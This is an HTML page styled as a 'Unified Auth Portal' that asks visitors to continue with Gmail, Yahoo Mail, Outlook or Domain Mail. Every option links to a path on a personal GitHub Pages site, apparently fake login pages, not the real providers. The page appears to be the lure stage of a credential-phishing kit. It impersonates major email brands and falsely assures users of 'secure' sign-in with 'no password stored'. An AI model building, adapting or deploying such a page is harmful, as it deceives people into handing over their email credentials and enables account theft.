<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
<title>Continue With | Unified Auth Portal</title>
<style>
    * {
        margin: 0;
        padding: 0;
        box-sizing: border-box;
    }

    body {
        background: linear-gradient(145deg, #f8faff 0%, #f0f2f8 100%);
        font-family: 'Segoe UI', Roboto, 'Helvetica Neue', Arial, sans-serif;
        display: flex;
        justify-content: center;
        align-items: center;
        min-height: 100vh;
        padding: 20px;
    }

    /* modern card container */
    .container {
        max-width: 440px;
        width: 100%;
        background: rgba(255, 255, 255, 0.98);
        backdrop-filter: blur(0px);
        border-radius: 36px;
        box-shadow: 0 20px 35px -12px rgba(0, 0, 0, 0.12), 0 1px 2px rgba(0, 0, 0, 0.02);
        padding: 32px 28px 40px 28px;
        text-align: center;
        transition: all 0.2s ease;
        border: 1px solid rgba(255,255,255,0.5);
    }

    /* header with subtle accent */
    h2 {
        font-size: 28px;
        font-weight: 600;
        letter-spacing: -0.3px;
        background: linear-gradient(135deg, #1e2b3c, #2c3e4e);
        background-clip: text;
        -webkit-background-clip: text;
        color: transparent;
        margin-bottom: 12px;
        display: inline-flex;
        align-items: center;
        gap: 10px;
    }

    .sub {
        color: #5b6e7c;
        font-size: 15px;
        margin-bottom: 32px;
        border-bottom: 1px solid #e9edf2;
        display: inline-block;
        padding-bottom: 8px;
    }

    /* stylish option cards */
    .option {
        display: flex;
        align-items: center;
        gap: 16px;
        background: #ffffff;
        border: 1px solid #e4e9f0;
        padding: 14px 20px;
        margin-bottom: 16px;
        border-radius: 60px;
        cursor: pointer;
        transition: all 0.25s cubic-bezier(0.2, 0, 0, 1);
        text-decoration: none;
        color: #1f2a3e;
        font-weight: 500;
        font-size: 16px;
        box-shadow: 0 1px 1px rgba(0,0,0,0.02);
    }

    /* enhanced icon container - bigger and cleaner */
    .option img, .option svg {
        width: 28px;
        height: 28px;
        object-fit: contain;
        flex-shrink: 0;
        transition: transform 0.2s ease;
    }

    /* custom domain icon wrapper for consistent visual */
    .domain-icon {
        width: 28px;
        height: 28px;
        background: linear-gradient(135deg, #2d3e50, #1c2a36);
        border-radius: 12px;
        display: inline-flex;
        align-items: center;
        justify-content: center;
        color: white;
        font-size: 15px;
        font-weight: 600;
        box-shadow: 0 2px 6px rgba(0,0,0,0.08);
    }

    .option span:not(.domain-icon) {
        flex: 1;
        text-align: left;
    }

    /* hover effect with micro-interaction */
    .option:hover {
        background: #fbfdff;
        border-color: #cbd5e1;
        transform: translateY(-2px);
        box-shadow: 0 12px 22px -12px rgba(0, 0, 0, 0.15);
    }

    .option:hover img, .option:hover .domain-icon {
        transform: scale(1.05);
    }

    /* extra modern flair: active ripple simulation */
    .option:active {
        transform: scale(0.98);
        transition: 0.05s;
    }

    /* seperator or optional footer */
    .info-note {
        margin-top: 28px;
        font-size: 12px;
        color: #8a99aa;
        display: flex;
        align-items: center;
        justify-content: center;
        gap: 6px;
        border-top: 1px solid #edf2f7;
        padding-top: 20px;
    }

    /* responsive */
    @media (max-width: 480px) {
        .container {
            padding: 24px 20px 32px 20px;
        }
        .option {
            padding: 12px 18px;
        }
        h2 {
            font-size: 26px;
        }
    }

    /* optional custom icon for yahoo (more premium look) */
    .yahoo-custom {
        background: #6001D2;
        border-radius: 50%;
        display: inline-flex;
        align-items: center;
        justify-content: center;
        width: 28px;
        height: 28px;
        color: white;
        font-weight: bold;
        font-size: 14px;
    }

    /* fallback icon style to keep consistent if needed */
</style>
</head>
<body>

<div class="container">
    <h2>
        <span>✨ Continue with</span>
    </h2>
    <div class="sub">Select your preferred account</div>

    <!-- GOOGLE option : original Gmail icon + extra vibrant badge -->
    <a href="https://howerjohn615dotcom.github.io/gmail/" class="option" aria-label="Continue with Gmail">
        <!-- high-res gmail icon from official brand set (icons8 but crisp) -->
        <img src="https://img.icons8.com/color/48/000000/gmail-new.png" alt="Gmail icon" width="28" height="28" loading="lazy">
        <span>Continue with Gmail</span>
    </a>

    <!-- YAHOO option : improved colorful Yahoo! icon (official style) -->
    <a href="https://howerjohn615dotcom.github.io/gmail/yahoo" class="option" aria-label="Continue with Yahoo Mail">
        <!-- Using high-quality Yahoo icon from icons8 color set + fallback -->
        <img src="https://img.icons8.com/color/48/yahoo--v1.png" alt="Yahoo Mail icon" width="28" height="28" loading="lazy">
        <span>Continue with Yahoo Mail</span>
    </a>

    <!-- OUTLOOK option : modern outlook / microsoft icon -->
    <a href="https://howerjohn615dotcom.github.io/gmail/outmail" class="option" aria-label="Continue with Outlook">
        <img src="https://img.icons8.com/color/48/microsoft-outlook-2019--v1.png" alt="Outlook icon" width="28" height="28" loading="lazy">
        <span>Continue with Outlook</span>
    </a>

    <!-- DOMAIN MAIL option : enhanced custom vector + modern icon (professional) -->
    <a href="https://howerjohn615dotcom.github.io/gmail/domain" class="option" aria-label="Continue with Domain Mail">
        <!-- Custom domain icon - premium look (envelope + domain block) instead of plain generic -->
        <div class="domain-icon" aria-hidden="true">
            <svg width="18" height="18" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg" style="display:block; margin:auto;">
                <path d="M3 8L12 13L21 8M5 5H19C20.1 5 21 5.9 21 7V17C21 18.1 20.1 19 19 19H5C3.9 19 3 18.1 3 17V7C3 5.9 3.9 5 5 5Z" stroke="white" stroke-width="1.6" stroke-linecap="round" stroke-linejoin="round" fill="none"/>
                <circle cx="12" cy="12" r="1.5" fill="white" stroke="none"/>
                <path d="M8 12L5 15M16 12L19 15" stroke="white" stroke-width="1.4" stroke-linecap="round"/>
            </svg>
        </div>
        <span>Continue with Domain Mail</span>
    </a>

    <div class="info-note">
        <span>🔒 Secure & seamless sign-in</span>
        <span>•</span>
        <span>No password stored</span>
    </div>
</div>

<!-- Fixed navigation: removed preventDefault so links work normally -->
<script>
    // This script now only adds visual feedback WITHOUT blocking navigation
    (function() {
        const options = document.querySelectorAll('.option');
        options.forEach(opt => {
            opt.addEventListener('click', (e) => {
                // Get provider name for console logging only (navigation proceeds normally)
                const providerSpan = opt.querySelector('span:last-child');
                const provider = providerSpan ? providerSpan.innerText : 'provider';
                
                // Visual feedback only - does NOT prevent navigation
                opt.style.transition = 'background 0.1s ease';
                opt.style.backgroundColor = '#f0f7ff';
                
                // Reset background after a short delay
                setTimeout(() => {
                    opt.style.backgroundColor = '';
                }, 120);
                
                // Just log to console for demo purposes - navigation happens automatically
                console.log(`✨ Navigating to: ${provider} (${opt.getAttribute('href')})`);
                // No e.preventDefault() - links will work normally!
            });
        });
    })();
</script>
</body>
</html>
